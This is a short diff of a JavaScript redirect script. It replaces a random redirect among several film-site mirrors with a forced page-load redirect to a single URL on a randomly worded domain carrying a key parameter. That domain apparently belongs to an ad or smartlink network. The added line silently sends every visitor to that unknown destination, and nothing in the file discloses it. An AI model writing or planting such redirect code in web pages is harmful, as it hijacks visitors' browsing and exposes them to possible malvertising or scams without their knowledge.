@@ -1,12 +1,5 @@
-var urlmain = document.URL;
-var param = document.URL.split("/")[3].replace("?m=1","").replace("?m=0","");
 var dataUrl = [
-"https://dev-filmk32.pantheonsite.io/",
-"https://dev-filmk21.pantheonsite.io/",
-"https://dev-cusfilms1.pantheonsite.io/",
-"https://dev-carfilms1.pantheonsite.io/",
-"https://dev-filmk32hd.pantheonsite.io/",
-"https://dev-neoflimfj.pantheonsite.io/"
+'https://wavermerchandiseweird.com/imzgcwsh?key=d0d188da2017ef9ee01fb562798d386a'
 ];
 var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
-window.location = randomItem + param;
+window.location = randomItem;
